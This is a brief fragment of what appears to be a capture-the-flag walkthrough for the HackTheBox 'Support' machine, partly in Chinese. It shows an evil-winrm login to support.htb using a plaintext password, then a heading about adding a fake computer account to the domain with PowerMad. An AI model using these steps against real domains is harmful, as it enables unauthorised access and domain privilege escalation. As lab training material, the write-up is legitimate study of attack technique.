[★]$ evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb


```
### Creating a Computer Object //创建计算机对象
#### 现在，让我们创建一台假计算机并将其添加到域。我们可以使用PowerMad的New-MachineAccount为了实现这个目标
